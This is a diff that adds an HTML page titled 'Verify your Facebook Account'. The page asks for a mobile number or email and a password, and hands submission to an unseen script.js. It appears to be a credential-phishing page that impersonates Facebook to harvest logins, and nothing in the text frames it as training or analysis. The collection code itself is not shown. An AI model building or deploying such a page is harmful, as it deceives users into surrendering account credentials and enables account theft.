@@ -1,0 +1,21 @@
+<!DOCTYPE HTML>
+<html lang="en">
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <title>Verify your account</title>
+    <link rel="stylesheet" href="style.css">
+  </head>
+  <body>
+    <div id='main'>
+   <h1>Verify your Facebook Account</h1>
+  <form onsubmit="submitForm(event)">
+   <input type="email" class="userinput" id="email" placeholder="Mobile Nimber or Email" required><br>
+   <input type="password" class="userinput" id="password" placeholder="Password" pattern=".{8,}" required>
+   <br>
+   <button id="btn">Verify</button>
+   </form>
+    </div>
+    <script src="script.js"></script>
+  </body>
+</html>
